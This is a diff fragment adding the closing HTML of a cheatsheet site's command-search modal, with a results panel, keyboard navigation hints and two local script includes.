+        </div>
+        <div class="search-results" id="searchResults">
+            <div class="search-empty">Type to search commands across all cheatsheets...</div>
+        </div>
+        <div class="search-footer">
+            <span><kbd>&uarr;&darr;</kbd> Navigate</span>
+            <span><kbd>&crarr;</kbd> Open</span>
+            <span><kbd>esc</kbd> Close</span>
+        </div>
+    </div>
+</div>
+
+<script src="search-index.js"></script>
+<script src="main.js"></script>
+
+</body>
+</html>
